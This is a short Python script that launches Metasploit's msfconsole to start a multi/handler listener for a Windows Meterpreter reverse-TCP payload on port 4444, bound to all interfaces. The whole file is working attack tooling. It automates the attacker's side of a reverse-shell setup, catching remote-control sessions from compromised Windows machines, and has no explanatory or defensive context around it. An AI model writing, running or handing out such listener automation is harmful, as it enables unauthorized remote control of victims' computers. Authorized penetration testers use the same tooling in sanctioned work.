import subprocess

def run():
    print("[*] Running Metasploit automation module...")
    subprocess.run(["msfconsole", "-q", "-x", "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit"])
